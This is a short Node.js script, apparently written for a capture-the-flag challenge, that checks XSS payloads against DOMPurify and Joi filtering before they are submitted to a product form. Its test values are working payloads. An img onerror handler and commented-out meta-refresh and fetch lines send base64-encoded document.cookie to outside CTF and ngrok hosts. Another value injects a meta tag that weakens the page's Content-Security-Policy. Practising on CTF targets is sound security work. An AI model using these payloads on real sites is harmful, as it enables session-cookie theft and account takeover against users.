/**
 * Used to test input locally prior to putting into the form for quicker validation of
 * XSS.
 */

const createDOMPurify = require('dompurify');
const { JSDOM }       = require('jsdom');
const Joi             = require('joi');

const filterHTML = (userHTML) => {
    window = new JSDOM('').window;
    DOMPurify = createDOMPurify(window);
    return DOMPurify.sanitize(userHTML, {
        ALLOWED_TAGS: ['strong', 'em', 'b', 'img', 'a', 's', 'ul', 'ol', 'li']
    });
}

const filterMeta = (metaHTML) => {
    window = new JSDOM('').window;
    DOMPurify = createDOMPurify(window);
    sanitized = DOMPurify.sanitize(metaHTML, {
        ALLOWED_TAGS: ['meta'],
        ALLOWED_ATTR: ['name', 'content', 'property', 'http-equiv'],
        WHOLE_DOCUMENT: true
    });
    return new JSDOM(sanitized).window.document.head.innerHTML;
}

const generateMeta = (title, description, keywords) => {
    return filterMeta(
    `
        <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">
        <meta property="title" content="${title}" />
        <meta property="og:description" content="${description}" />
        <meta name="keywords" content="${keywords}" />
    `);
}
function main(){
    const schema = Joi.object({
        product_name: Joi.string().required(),
        product_keywords: Joi.string().required(),
        product_og_title: Joi.string().required(),
        product_price: Joi.number().required(),
        product_desc: Joi.string().required(),
        product_og_desc: Joi.string().required()
    });

    VALUES = {
        product_name: "<script>alert(1)</script>",
        product_desc : "<img id=\"0\" name=\"potionTypes\" src=\"/test\" /><img id=\"1\" name=\"potionTypes\" src=\"dne.jpg#'onerror=fetch('http://ctf.zealous-bird-69694.pktriot.net/admin/'+btoa(document.cookie))//\" />",
        product_og_title: "simple",
        product_price: "-1",
        product_keywords: "0;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" http-equiv=\"refresh\"",
        //product_og_desc: "\"/><meta http-equiv=\"refresh\" content=\"0; url=javascript:fetch('https://ctf.zealous-bird-69694.pktriot.net/' + btoa(document.cookie))\" />"
        product_og_desc: "\"><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' http://134.209.22.121:31737/static/js/product.js http://134.209.22.121:31737/static/js/jquery.min.js\">"
    }

    // fetch('https://2d0e-75-119-244-237.ngrok.io/d/' + btoa(document.cookie), {headers: {"ngrok-skip-browser-warning": "69420"}})
    const { error, value } = schema.validate(VALUES);

    if(error){
        console.log("There was an error in validation:")
        console.log(error.message)
        return
    }
    console.log("VALUES")
    console.log(value)
    const {product_og_title, product_keywords, product_og_desc, product_desc, product_name } = value

    console.log(generateMeta(product_og_title, product_og_desc, product_keywords))
    console.log("Product Description")
    console.log(filterHTML(product_desc))
    console.log("Product Name")
    console.log(product_name)
}

main()
